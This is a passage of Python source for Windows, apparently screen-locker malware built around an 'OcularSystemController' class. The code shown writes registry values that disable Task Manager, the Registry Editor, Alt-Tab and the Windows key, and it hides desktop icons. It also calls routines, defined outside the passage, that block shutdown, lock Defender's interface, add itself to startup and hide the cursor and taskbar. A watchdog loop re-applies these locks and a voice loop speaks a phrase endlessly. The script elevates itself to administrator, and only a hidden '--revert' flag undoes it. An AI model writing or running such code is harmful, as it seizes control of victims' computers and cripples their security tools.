            winreg.CloseKey(key)
        except:
            pass
    
    # -----------------------------------------------------------------
    # INFINITE AI VOICE ENGINE
    # -----------------------------------------------------------------
    def infinite_voice_loop(self):
        try:
            import win32com.client
            speaker = win32com.client.Dispatch("SAPI.SpVoice")
            speaker.Rate = 1
            speaker.Volume = 100
            for v in speaker.GetVoices():
                desc = v.GetDescription()
                if "Zira" in desc or "David" in desc or "Mark" in desc:
                    speaker.Voice = v
                    break
            while self.running and not self.event_stop.is_set():
                speaker.Speak(ACTION_TRIGGER_PHRASE, 1)
                self.system_state['voice_plays'] += 1
                for _ in range(REPEAT_CYCLE_SECONDS):
                    if self.event_stop.is_set():
                        break
                    time.sleep(1)
        except Exception as e:
            pass
    
    # -----------------------------------------------------------------
    # WATCHDOG
    # -----------------------------------------------------------------
    def system_watchdog(self):
        while self.running and not self.event_stop.is_set():
            time.sleep(WATCHDOG_SLEEP)
            self.system_state['cycle_count'] += 1
            try:
                self.lock_task_manager()
                self.block_system_shutdown()
                self.lock_defender_ui()
                self.add_system_startup()
                if self.bmp_path:
                    self.apply_system_wallpaper(self.bmp_path)
                if not self.taskbar_hidden:
                    self.hide_and_lock_taskbar()
                if not self.mouse_hidden:
                    self.hide_system_cursor()
                if not self.win_key_disabled:
                    self.disable_windows_key()
                self.hide_desktop_icons()
                self.disable_alt_shortcuts()
                self.lock_registry_editor()
            except Exception as e:
                self.system_state['last_error'] = str(e)
    
    def hide_desktop_icons(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced")
            winreg.SetValueEx(key, "HideIcons", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    def disable_alt_shortcuts(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            winreg.SetValueEx(key, "NoAltTab", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoTaskSwitching", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    def lock_registry_editor(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    # -----------------------------------------------------------------
    # ACTIVATION
    # -----------------------------------------------------------------
    def activate_system(self):
        self.bmp_path = self.prepare_system_wallpaper()
        if self.bmp_path:
            self.apply_system_wallpaper(self.bmp_path)
        
        self.lock_task_manager()
        self.block_system_shutdown()
        self.lock_defender_ui()
        self.add_system_startup()
        self.hide_and_lock_taskbar()
        self.hide_system_cursor()
        self.disable_windows_key()
        self.hide_desktop_icons()
        self.disable_alt_shortcuts()
        self.lock_registry_editor()
        
        self.voice_thread = threading.Thread(target=self.infinite_voice_loop, daemon=True)
        self.voice_thread.start()
        
        self.watchdog_thread = threading.Thread(target=self.system_watchdog, daemon=True)
        self.watchdog_thread.start()
        
        while self.running:
            time.sleep(1)
            self.system_state['uptime_seconds'] += 1
    
    # -----------------------------------------------------------------
    # REVERT
    # -----------------------------------------------------------------
    def revert_system(self):
        self.running = False
        self.event_stop.set()
        
        self.unlock_task_manager()
        self.unblock_system_shutdown()
        self.unlock_defender_ui()
        self.remove_system_startup()
        self.restore_taskbar()
        self.restore_system_cursor()
        self.enable_windows_key()
        
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, "", 0x01 | 0x02)
        
        if self.bmp_path and os.path.isfile(self.bmp_path):
            try:
                os.remove(self.bmp_path)
            except:
                pass
        
        import os
        os._exit(0)

# ---------------------------------------------------------------------
# ENTRY POINT
# ---------------------------------------------------------------------
if __name__ == "__main__":
    if "--revert" in sys.argv or "/revert" in sys.argv:
        try:
            ctl = OcularSystemController()
            ctl.revert_system()
        except:
            pass
        sys.exit(0)
    
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = " ".join(sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 0)
        sys.exit(0)
    
    controller = OcularSystemController()
    controller.activate_system()